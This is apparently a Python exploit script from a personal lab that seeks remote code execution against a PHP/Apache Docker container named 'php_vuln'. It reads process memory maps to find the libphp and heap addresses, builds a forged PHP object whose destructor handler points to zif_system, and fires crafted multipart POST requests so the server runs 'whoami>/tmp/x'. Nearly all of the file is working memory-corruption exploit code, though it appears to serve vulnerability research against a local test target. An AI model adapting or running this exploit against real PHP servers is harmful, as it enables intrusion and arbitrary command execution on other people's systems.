#!/usr/bin/env python3
"""oom73: v5 aimed RCE — pointer-first values, maps-based aiming.

Measured laws this builds on:
  - walk window reads val[0:8] (rotation 0) of SOME fat value — stable j=0
    across boots and fires (3/3 cores: 4d4d010203040506)
  - fat values sit 3584B apart; value0 = heap_base + 0x1718 (2 boots)
  - bases per boot, shared by all children; readable from /proc/pid/maps
    (Zend heap = only anonymous rw-p region >= 2MB)
Design: EVERY value (all bodies: warm, sacrifice, finishers) = 200B tile
  T with T[0:8] = P = VA0+8 (pointer-first!):
    P+0   rc=1 (decrement lands here -> 0)
    P+4   type_info=0x108 (IS_OBJECT|DESTRUCTOR_CALLED; ce never read)
    P+8   handle=1          P+12 pad=0
    P+16  ce=0              P+24 handlers=VA0+152
    P+32  This=0            P+40 u1=0        P+44 num_args=1
    P+48  prev=0            P+56 sym=0       P+64 req=0   P+72 pad=0
    P+80  argz{VA0+112, IS_STRING=6, 0}
    P+104 gs{rc=1,type=0x106,h=0,len=12,"whoami>/tmp/x\\0"}
    P+152 table{offset=0, free_obj=&zif_system, get=0, set=0}
  Window reads P -> subl -> 0 -> rc_dtor_func(P) -> store_del ->
  free_obj=zif_system -> system("whoami>/tmp/x").
"""
import subprocess, sys, time, struct, re

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0


def sh(c, t=90):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def measure_bases():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    base = None
    heap = None
    for ln in maps.splitlines():
        rng = ln.split()[0]
        a, b = [int(x, 16) for x in rng.split("-")]
        perms = ln.split()[1]
        if base is None and "libphp.so" in ln and perms.startswith("r"):
            base = a
        if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
                and (b - a) >= 0x200000 and perms.startswith("rw"):
            if heap is None:
                heap = a
    return base, heap


def build_tile(libphp_base, VA0):
    Pp = VA0 + 8
    T = bytearray(200)
    struct.pack_into("<Q", T, 0, Pp)                 # window pointer
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)  # rc ti handle pad
    struct.pack_into("<QQ", T, 16, 0, 0)             # ce(16) .. handlers@24? see below
    struct.pack_into("<Q", T, 24, VA0 + 152)         # handlers (P+24 -> VA0+32?? NO)
    # NOTE: P+24 = VA0+8+24 = VA0+32 -> T[32]! Fix below.
    struct.pack_into("<Q", T, 32, VA0 + 152)         # handlers table ptr (correct slot)
    struct.pack_into("<QQ", T, 40, 0, 0)             # This.value(40) u1(48)
    struct.pack_into("<I", T, 52, 1)                 # num_args (P+44 = VA0+52)
    struct.pack_into("<QQ", T, 56, 0, 0)             # prev sym
    struct.pack_into("<QQ", T, 72, 0, 0)             # req pad
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0) # argz (P+80 = VA0+88)
    struct.pack_into("<IIQI", T, 112, 1, 0x106, 0, len(CMD))  # gs rc type h len@128
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQQQ", T, 152, 0, libphp_base + ZIF_SYSTEM, 0, 0)  # table
    return bytes(T)


print("[0] boot + core env", flush=True)
boot_core_env()
base, heap = measure_bases()
VA0 = heap + 0x1718
print("  libphp=0x%x heap=0x%x VA0=0x%x &zif_system=0x%x"
      % (base, heap, VA0, base + ZIF_SYSTEM), flush=True)
T = build_tile(base, VA0)
print("  tile[0:40]: %s" % T[:40].hex(), flush=True)

print("[1] warm (all values = weaponized tile)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T))
print("    warm done", flush=True)

print("[2] sacrifice + finishers", flush=True)
for fi in range(4):
    code, resp = post(P.build_attack(3400, 9200000 + fi * 100000, value_tile=T))
    print("  fire%d: %s %r" % (fi, code, resp[:80]), flush=True)
    time.sleep(2)
    chk = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    if "No such" not in chk:
        print("  /tmp/x: [%s]" % chk, flush=True)
        print("*** RCE CONFIRMED on fire %d ***" % fi, flush=True)
        break
    print("  /tmp/x: not yet", flush=True)

print("[3] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
